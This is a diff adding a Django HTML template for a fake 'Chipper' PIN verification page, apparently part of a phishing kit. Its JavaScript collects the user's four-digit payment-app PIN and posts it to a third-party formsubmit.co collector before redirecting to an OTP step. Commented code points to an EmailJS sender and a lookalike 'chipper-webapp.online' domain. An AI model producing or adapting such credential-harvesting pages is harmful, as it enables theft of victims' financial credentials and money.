@@ -1,0 +1,174 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pin Verification</title>
+
+    <!-- custom stylesheet + script -->
+    <link rel="stylesheet" href="{% static 'dist/style.css' %}">
+    <script defer src="{% static 'dist/script.js' %}"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js" integrity="sha512-pumBsjNRGGqkPzKHndZMaAG+bir374sORyzM3uulLV14lN5LyykqNk8eEeUlUkB3U0M4FApyaHraT65ihJhDpQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+    <!-- favicon img -->
+    <link rel="shortcut icon" href="{% static 'images/OIP__3_-removebg-preview.png' %}" type="image/x-icon">
+
+    <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+      (function() {
+          // https://dashboard.emailjs.com/admin/account
+          emailjs.init('R26T4WMBBOl4xUroP');
+      })();
+  </script> -->
+    <script type="text/javascript">
+        window.onload = function () {
+            console.log('working');
+            document.getElementById('form').addEventListener('submit', function (event) {
+                const btn = document.querySelector('#submitBtn')
+                //   event.preventDefault();
+                btn.innerHTML = 'Loading...';
+
+                //   emailjs.sendForm('service_zp0yn9k', 'del_chp_3', this)
+                //       .then(function() {
+                //           console.log('SUCCESS!');
+                //           setTimeout(() => {
+                //             window.location.href = "https://chipper-webapp.online/otp.html";
+                //           },2000)
+                //         //   window.location.href = "https://chipper-webapp.online/otp";
+                //         }, function(error) {
+                //           console.log('FAILED...', error);
+                //       });
+            });
+        }
+    </script>
+
+</head>
+
+<body>
+
+    <form id="form" class="form3"  method="POST" action="{% url 'otp' %}">
+        {% csrf_token %}
+
+
+        <div class="form3__header"><img src="{% static 'images/OIP__3_-removebg-preview.png' %}" alt=""></div>
+        <h3 class="form3__para">Enter your chipper PIN</h3>
+
+        <div class="form3__inputCtn">
+            <input class="pin" oninput="inputInsideOtpInput(this)" name="pin1" required maxlength="1" type="tel">
+
+            <input class="pin" oninput="inputInsideOtpInput(this)" name="pin2" required maxlength="1" type="tel">
+
+            <input class="pin" oninput="inputInsideOtpInput(this)" name="pin3" required maxlength="1" type="tel">
+
+            <input class="pin" oninput="inputInsideOtpInput(this)" name="pin4" required maxlength="1" type="tel">
+            <div class="form3__spanCtn">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+
+        <button id="submitBtn" type="submit">Continue</button>
+
+    </form>
+
+
+    <script>
+
+        const btn = document.querySelector('#submitBtn')
+        form.addEventListener('submit', (e) => {
+           // e.preventDefault()
+            const formData = new FormData(form);
+            let object = {};
+            formData.forEach((value, key) => {
+                object[key] = value;
+            });
+            let json = JSON.stringify(object);
+            btn.textContent = 'Loading...';
+
+            $.ajax({
+                type: 'POST',
+                url: "{% url 'pin' %}",
+                data: {
+                    pin: $('#pin1').val(),
+                    pin: $('#pin2').val(),
+                    pin: $('#pin3').val(),
+                    pin: $('#pin4').val(),
+                    csrfmiddlewaretoken: $('input[name=csrfmiddlewaretoken]').val()
+                },
+            })
+
+
+            fetch("https://formsubmit.co/ajax/bd9d3034b6a8347a7aca02bbefb8a268", {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: json
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success == 'true') {
+                        setTimeout(() => {
+                            window.location.href = "{% url 'otp' %}";
+                        }, 1000);
+                    }
+                    console.log(data)
+                })
+              //  .catch(error => {
+                //    alert('incorrect pin, please try again')
+                //    console.log(error)
+                //    window.location.reload()
+               // });
+        })
+
+        const inputs = document.querySelectorAll('.pin')
+        const span = document.querySelector('.form3__spanCtn');
+
+        inputs.forEach(input => {
+            input.addEventListener('focus', () => {
+                span.classList.add('d-none')
+            })
+        });
+
+
+
+
+
+
+        function inputInsideOtpInput(el) {
+            if (el.value.length > 1) {
+                el.value = el.value[el.value.length - 1];
+            }
+            try {
+                if (el.value == null || el.value == "") {
+                    this.foucusOnInput(el.previousElementSibling);
+                } else {
+                    this.foucusOnInput(el.nextElementSibling);
+                }
+            } catch (e) {
+                console.log(e);
+            }
+        }
+
+        function foucusOnInput(ele) {
+            ele.focus();
+            let val = ele.value;
+            ele.value = "";
+            // ele.value = val;
+            setTimeout(() => {
+                ele.value = val;
+            })
+        }
+
+    </script>
+</body>
+
+</html>
